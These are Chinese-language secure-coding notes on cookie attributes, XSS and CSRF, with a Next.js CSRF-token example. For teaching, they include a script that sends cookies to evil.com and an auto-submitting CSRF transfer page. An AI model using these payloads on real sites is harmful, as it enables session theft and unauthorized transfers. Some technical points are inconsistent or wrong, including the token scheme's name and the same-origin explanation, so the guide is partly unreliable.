# Cookie 與 安全開發筆記

## 1. Cookie 基礎概念

### 1.1 為什麼需要理解 Cookie 機制

* Cookie 是網站存儲用戶狀態的主要方式，特別是身份驗證信息
* 不當的 Cookie 配置會導致多種安全漏洞（如 XSS、CSRF）
* 瀏覽器發送請求時會自動附加 Cookie，這是許多攻擊的基礎

### 1.2 讀／寫 Cookie 基礎

| 操作          | JavaScript 範例                                            | 說明                             |
| ----------- | -------------------------------------------------------- | ------------------------------ |
| 讀取整串        | `document.cookie`                                        | 回傳 `key=value; key2=value2` 字串 |
| 解析為物件       | `.split("; ").map(kv => kv.split("=")).reduce(...)`      | 手動轉成物件                         |
| 讀取單一值       | `getCookie("lang")`                                      | 封裝函式取值                         |
| 寫入 Cookie   | `document.cookie = "theme=dark; path=/; max-age=604800"` | 同名、同 path 即覆寫                  |
| 設定 HttpOnly | ❌ JavaScript 無法設定                                        | 只能伺服器設定，JS 無法讀寫                |

### 1.3 為什麼不應透過 JavaScript 存取敏感 Cookie

* JavaScript 可被注入（XSS），導致攻擊者可讀取所有非 HttpOnly Cookie
* 前端 JS 通常不需要直接訪問敏感的身份驗證 Cookie（如 session）
* 敏感資訊應由伺服器處理，不暴露給客戶端


## 2. Cookie 安全屬性

### 2.1 HttpOnly 屬性

* `HttpOnly` 只能防止 JavaScript **讀取** Cookie，但不能防止覆寫
* 主要用於防止 XSS 攻擊竊取敏感 Cookie（如 session）
* 伺服器端設定: `Set-Cookie: session=abc123; HttpOnly`
* **重要功能**：標記為 HttpOnly 的 Cookie 對 `document.cookie` API 完全不可見

**HttpOnly 的關鍵好處**：
* 即使網站存在 XSS 漏洞，攻擊者也無法通過 JavaScript 直接獲取 session cookie
* 減少憑證被盜用的風險
* 為敏感 Cookie（如身份驗證）提供額外保護層

**`HttpOnly` 擋不了覆寫**：

* 攻擊者若能執行 JS，可用 `document.cookie = "session=attacker_value"` 覆寫同名 Cookie
* 覆寫成功後，下次發送請求時瀏覽器將附帶新的 session 值
* 需要配合其他安全措施共同防禦

### 2.2 SameSite 屬性

| SameSite 屬性 | 跨站請求是否附帶 Cookie           | 常見用途                     |
| ----------- | ------------------------- | ------------------------ |
| `Strict`    | ❌ 不會附帶（包括 GET）            | 最嚴格防禦 CSRF，需使用者從同一站點觸發互動 |
| `Lax`       | ✅ 附帶 GET，但不附帶 POST 等變更操作  | 預設值，適合大多數網站基本防禦需求        |
| `None`      | ✅ 完全附帶，但**必須搭配 `Secure`** | 第三方請求需附帶 Cookie（如第三方登入）  |

### 2.3 Secure 屬性

* 確保 Cookie 只能通過 HTTPS 連接傳送
* 防止 Cookie 在不安全的連接中被竊取
* 當設置 `SameSite=None` 時必須搭配 `Secure` 使用

## 3. 常見安全威脅與防禦

### 3.1 XSS 攻擊

#### 未加 `HttpOnly` 的 XSS 範例

1. 網站登入後回傳：

   ```http
   Set-Cookie: session=abc123; Secure
   ```
2. 攻擊者留言內容：

   ```html
   <script>
     fetch('https://evil.com?c=' + document.cookie)
   </script>
   ```
3. 使用者打開頁面時，自動執行 JS，將 Cookie 傳到攻擊者伺服器
4. 攻擊者複製 Cookie，在自己瀏覽器中偽裝登入成功

#### XSS 防禦建議

* 為敏感 Cookie 設置 `HttpOnly` 屬性
* 實施內容安全政策 (CSP)
* 對用戶輸入進行嚴格的驗證和轉義

### 3.2 CSRF 攻擊

#### 即使有 `HttpOnly` 仍有 CSRF 風險

CSRF 攻擊利用瀏覽器自動附帶 Cookie：

1. 使用者登入 bank.com，取得 Cookie：`session=abc123; HttpOnly`
2. 造訪 evil.com，自動提交表單到 bank.com/transfer
3. 瀏覽器自動帶上 session Cookie，完成未授權操作

**關鍵：** `HttpOnly` 防的是 XSS，不是 CSRF。

#### CSRF 攻擊程式碼範例

攻擊者在 evil.com 上放置的惡意頁面 (evil.html)：

```html
<!DOCTYPE html>
<html>
<head>
  <title>贏取免費獎品！</title>
</head>
<body onload="document.getElementById('transferForm').submit()">
  <h1>恭喜您贏得大獎！請稍候...</h1>
  
  <!-- 自動提交的隱藏表單 -->
  <form id="transferForm" action="https://bank.com/api/transfer" method="POST" style="display:none">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="50000" />
  </form>
  
  <!-- 更隱蔽的攻擊也可以用 JavaScript 發送 AJAX 請求 -->
  <script>
    // 另一種攻擊方式
    /*
    fetch('https://bank.com/api/transfer', {
      method: 'POST',
      credentials: 'include', // 關鍵：發送時帶上 cookies
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ to: 'attacker_account', amount: 50000 })
    });
    */
  </script>
</body>
</html>
```

攻擊流程：
1. 使用者已登入銀行網站，持有有效的 session cookie
2. 使用者被誘導訪問 evil.com 或接收到含有惡意程式碼的電子郵件
3. 頁面載入後自動提交表單到 bank.com/api/transfer
4. 由於瀏覽器的同源政策，當向 bank.com 發送請求時，會帶上 bank.com 的 cookie
5. bank.com 的伺服器看到有效的 session cookie，因此授權轉賬操作

#### CSRF 防禦建議

* 使用 `SameSite=Lax` 或 `Strict` 屬性
* 實施 CSRF Token 機制


## 4. CSRF Token 實作方案

### 4.1 Synchronizer Token（同步式）

* Token 存在 Session 中，伺服器注入 `<input type="hidden" name="csrf">`
* 前端送出後，伺服器比對 `req.session.csrfToken === req.body.csrf`
* 適合傳統多頁應用

### 4.2 Next.js 與 CSRF Token 整合範例 (Double Submit Cookie)

同步式 CSRF Token 是目前最安全的 CSRF 防護方式，以下提供一個使用 Next.js App Router 的完整實作範例。這個範例說明如何在現代 React 應用中實現 CSRF 保護：

#### 1. Token 產生與儲存 (Server-Side)

```ts
// lib/csrf.ts - 負責 CSRF Token 的生成與驗證
import { cookies } from "next/headers";
import { randomBytes } from "crypto";

export function getCsrfToken() {
  const cookieStore = cookies();
  let token = cookieStore.get("csrf")?.value;
  
  // 若無現有 token，則生成新的
  if (!token) {
    // 使用加密安全的隨機字元產生 token
    token = randomBytes(32).toString("hex");
    
    // 設定為 httpOnly 確保 JS 無法讀取，strict 確保跨站請求不會帶上
    cookieStore.set("csrf", token, { 
      httpOnly: true,      // 防止 JavaScript 讀取
      sameSite: "strict",  // 防止跨站請求
      secure: true,        // 只在 HTTPS 連接中傳送
      path: "/"            // 適用於整個網站
    });
  }
  
  return token;
}
```

#### 2. 在表單頁面中注入 Token (Server Component)

```tsx
// app/(dashboard)/transfer/page.tsx - 伺服器端元件，注入 CSRF Token
import { getCsrfToken } from "@/lib/csrf";

export default function TransferPage() {
  // 從伺服器取得或生成 CSRF Token
  const csrf = getCsrfToken();
  
  return (
    <div className="form-container">
      <h1>轉帳表單</h1>
      <form action="/api/transfer" method="POST">
        {/* 隱藏的 CSRF Token 欄位 */}
        <input type="hidden" name="csrf" value={csrf} />
        
        {/* 表單其他欄位 */}
        <div className="form-group">
          <label htmlFor="recipient">收款帳號</label>
          <input type="text" id="recipient" name="recipient" required />
        </div>
        
        <div className="form-group">
          <label htmlFor="amount">金額</label>
          <input type="number" id="amount" name="amount" min="1" required />
        </div>
        
        <button type="submit">確認轉帳</button>
      </form>
    </div>
  );
}
```

#### 3. API Endpoint 驗證 Token (Route Handler)

```ts
// app/api/transfer/route.ts - API 路由，負責驗證 CSRF Token
import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";

export async function POST(req: NextRequest) {
  // 從請求中取得表單數據
  const formData = await req.formData();
  
  // 比對 Cookie 中的 CSRF token 與表單提交的 token
  const csrfBody = formData.get("csrf") as string | null;
  const csrfCookie = cookies().get("csrf")?.value;

  // CSRF 驗證失敗時返回 403 錯誤
  if (!csrfBody || !csrfCookie || csrfBody !== csrfCookie) {
    return NextResponse.json(
      { error: "CSRF 驗證失敗" }, 
      { status: 403 }
    );
  }

  // 若驗證通過，執行轉帳操作
  const recipient = formData.get("recipient") as string;
  const amount = Number(formData.get("amount"));
  
  try {
    // 實際的轉帳邏輯...
    // await transferFunds(recipient, amount);
    
    return NextResponse.json({ 
      success: true, 
      message: "轉帳成功" 
    });
  } catch (error) {
    return NextResponse.json({ 
      success: false, 
      error: "轉帳處理失敗" 
    }, { status: 500 });
  }
}
```

### 4.3 CSRF 防護實施關鍵點

* **整合性**: CSRF 保護需要前後端協同工作，從 Token 生成到驗證
* **安全儲存**: Token 必須存儲在 HttpOnly、SameSite=Strict 的 Cookie 中
* **一次性使用**: 理想情況下，每次提交表單後應重新生成 Token（防止重放攻擊）
* **時間限制**: 可考慮為 Token 加入過期時間，定期強制刷新

### 4.4 為何攻擊者無法偽造 CSRF Token?

* **同源政策**: 攻擊網站無法讀取目標網站的 Cookie 或 DOM 內容
* **HttpOnly**: JavaScript 無法讀取標記為 HttpOnly 的 Cookie
* **SameSite=Strict**: 嚴格限制 Cookie 只在同一網站的請求中發送

> **注意**: 若網站存在 XSS 漏洞，CSRF 保護可能被繞過，因為攻擊者可以通過 XSS 直接讀取頁面中的 Token。這也是為什麼 XSS 防護同樣重要的原因。

## 5. 綜合安全設定範例

```http
# Session Cookie（推薦）
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax

# CSRF Token Cookie（Double Submit）
Set-Cookie: csrfToken=xyz; Path=/; Secure; SameSite=Strict
```

> 建議：Session Cookie 使用 `Lax`，CSRF Token Cookie 使用 `Strict`。

## 6. 安全實施建議小結

* `HttpOnly` 防止 **XSS 偷 Cookie**，無法防止 **CSRF 自動送 Cookie**
* **最佳實務**：`SameSite` + CSRF Token（同步式或雙重 Cookie）雙重防護
* 若有 XSS 風險，建議採用同步式 Token（由後端注入頁面）
* 關鍵敏感操作應增加額外驗證（如二次密碼、OTP）
